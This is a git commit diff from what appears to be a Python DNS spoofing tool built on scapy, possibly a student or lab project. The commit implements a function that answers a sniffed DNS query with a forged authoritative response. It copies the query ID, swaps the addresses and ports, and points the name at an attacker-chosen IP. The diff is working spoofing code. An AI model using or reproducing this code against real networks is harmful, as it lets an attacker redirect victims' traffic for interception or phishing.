f82fe0a6197c432cc8f79193d571847e5d8e8e8f
navin604 <55507003+navin604@users.noreply.github.com>
2023-05-31 16:26:26 -0400

    Added method to craft spoofed dns response

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ from scapy.all import sniff, send
 from scapy.layers.inet import UDP, IP
 from typing import Tuple
 import argparse
+from scapy.layers.dns import DNS, DNSQR, DNSRR
 
 
 def process_args() -> Tuple[str, str]:
@@ -14,7 +15,16 @@ def process_args() -> Tuple[str, str]:
 
 
 def spoof_packets(packet, spoof_ip: str):
-    pass
+    ip = IP(dst=packet[IP].src, src=packet[IP].dst)
+    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
+    rr = DNSRR(rrname=packet[DNS].qd.name, ttl=10, rdata=spoof_ip)
+    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=rr)
+    pkt = ip / udp / dns
+    try:
+        send(pkt, verbose=0)
+    except (OSError, PermissionError) as e:
+        print(f"{e}")
+        sys.exit()
 
 
 def sniff_init(target: str, spoof_ip: str):
